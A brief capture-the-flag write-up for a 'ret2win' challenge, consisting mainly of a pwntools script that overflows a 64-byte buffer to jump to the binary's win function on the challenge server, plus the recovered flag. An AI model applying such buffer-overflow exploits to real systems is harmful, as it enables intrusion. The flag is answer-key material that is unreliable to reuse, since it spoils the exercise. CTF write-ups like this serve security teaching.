# ret2win

## Description
Win the flag!

## Writeup
```python
#! /bin/python3
from pwn import *
elf = context.binary = ELF('./ret2win')
target = remote("ctf.copsiitbhu.co.in", 31141)
target.recvline()
target.sendline(b'A'*64+pack(elf.symbols.win))
target.recvline()
print("FLAG: " + target.recvline().decode('utf-8'))
```

## FLAG
COPS{y0u_w1n_7h15_fl4g}
